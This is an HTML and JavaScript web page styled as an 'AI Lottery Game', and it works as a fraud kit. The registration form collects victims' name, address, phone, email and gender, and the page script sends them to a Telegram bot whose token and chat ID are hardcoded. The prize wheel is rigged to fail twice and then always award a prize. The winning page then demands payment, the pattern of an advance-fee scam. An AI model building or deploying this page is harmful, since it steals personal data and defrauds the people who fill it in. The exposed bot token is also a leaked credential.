<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Lottery Game</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
            text-align: center;
        }

        .container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            margin: 20px auto;
            padding: 20px;
            width: 90%;
            max-width: 400px;
        }

        h1, h2 {
            color: #4CAF50;
        }

        input, select, button {
            width: 100%;
            margin: 10px 0;
            padding: 10px;
            font-size: 16px;
        }

        input[type="file"] {
            padding: 5px;
        }

        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            font-weight: bold;
            border-radius: 5px;
        }

        button:hover {
            background-color: #45a049;
        }

        .hidden {
            display: none;
        }

        /* Spinning Wheel */
        #wheelContainer {
            position: relative;
            margin: 20px auto;
            width: 300px;
            height: 300px;
        }

        #wheel {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: conic-gradient(
                #FFDD57 0deg 45deg,
                #FF6347 45deg 90deg,
                #90EE90 90deg 135deg,
                #ADD8E6 135deg 180deg,
                #FFB6C1 180deg 225deg,
                #FFD700 225deg 270deg,
                #FF6347 270deg 315deg,
                #FFD700 315deg 360deg
            );
            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.3);
            transition: transform 4s ease-out;
        }

        #pointer {
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 0;
            height: 0;
            border-left: 15px solid transparent;
            border-right: 15px solid transparent;
            border-bottom: 30px solid red;
            z-index: 10;
        }

        .message {
            margin-top: 20px;
            font-size: 18px;
        }
    </style>
</head>
<body>

<!-- Registration Page -->
<div class="container" id="registrationPage">
    <h1>Register for AI Lottery</h1>
    <form id="registrationForm">
        <input type="text" id="firstName" placeholder="First Name" required>
        <input type="text" id="lastName" placeholder="Last Name" required>
        <input type="text" id="address" placeholder="Address" required>
        <input type="tel" id="phone" placeholder="Phone Number" required>
        <input type="email" id="email" placeholder="Email Address" required>
        <label>Upload Picture:</label>
        <input type="file" id="picture" accept="image/*" required>
        <select id="gender" required>
            <option value="" disabled selected>Select Gender</option>
            <option value="Male">Male</option>
            <option value="Female">Female</option>
        </select>
        <button type="submit">Submit & Play</button>
    </form>
</div>

<!-- Spinning Wheel Page -->
<div class="container hidden" id="spinningPage">
    <h2>Spin the Wheel</h2>
    <div id="wheelContainer">
        <div id="pointer"></div>
        <div id="wheel"></div>
    </div>
    <p class="message" id="spinMessage">Click the button below to spin!</p>
    <button id="spinButton">Spin Now</button>
</div>

<!-- Winning Page -->
<div class="container hidden" id="winningPage">
    <h2>Congratulations!</h2>
    <p id="winningDetails"></p>
    <button onclick="alert('Please pay to download the certificate.')">Download Certificate</button>
</div>

<script>
    const TELEGRAM_BOT_TOKEN = "7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY"; // Replace with your bot token
    const CHAT_ID = "874563737"; // Replace with your chat ID

    const registrationForm = document.getElementById('registrationForm');
    const registrationPage = document.getElementById('registrationPage');
    const spinningPage = document.getElementById('spinningPage');
    const winningPage = document.getElementById('winningPage');
    const spinButton = document.getElementById('spinButton');
    const spinMessage = document.getElementById('spinMessage');
    const wheel = document.getElementById('wheel');
    const winningDetails = document.getElementById('winningDetails');

    const prizes = ['$2000', '$5000', '$1000', '$15000', '$20000', '$30000'];
    let spinCount = 0;

    // Send data to Telegram Bot
    async function sendToTelegram(data) {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: data
            })
        });
    }

    // Registration Submission
    registrationForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const firstName = document.getElementById('firstName').value;
        const lastName = document.getElementById('lastName').value;
        const address = document.getElementById('address').value;
        const phone = document.getElementById('phone').value;
        const email = document.getElementById('email').value;
        const gender = document.getElementById('gender').value;
        const picture = document.getElementById('picture').files[0];

        const message = `
📋 *New Lottery Registration* 📋
👤 *Name:* ${firstName} ${lastName}
🏠 *Address:* ${address}
📞 *Phone:* ${phone}
✉️ *Email:* ${email}
🧑 *Gender:* ${gender}
        `;

        await sendToTelegram(message);

        registrationPage.classList.add('hidden');
        spinningPage.classList.remove('hidden');
    });

    // Spinning Wheel Logic
    spinButton.addEventListener('click', () => {
        spinCount++;
        let angle;

        if (spinCount === 1 || spinCount === 2) {
            angle = 720 + Math.random() * 360; // Stops at "Try Again"
            spinMessage.innerText = `Try Again! (${3 - spinCount} spin(s) left)`;
        } else {
            // 3rd Spin - Random prize selection
            const prizeIndex = Math.floor(Math.random() * prizes.length);
            const winningPrize = prizes[prizeIndex];
            angle = 720 + (prizeIndex * 45); // Each segment is 45 degrees
            spinMessage.innerText = "Congratulations!";
            setTimeout(() => {
                spinningPage.classList.add('hidden');
                winningPage.classList.remove('hidden');
                winningDetails.innerText = `You won ${winningPrize}! Please proceed to payment.`;
            }, 4500);
        }

        wheel.style.transform = `rotate(${angle}deg)`;
    });
</script>

</body>
</html>
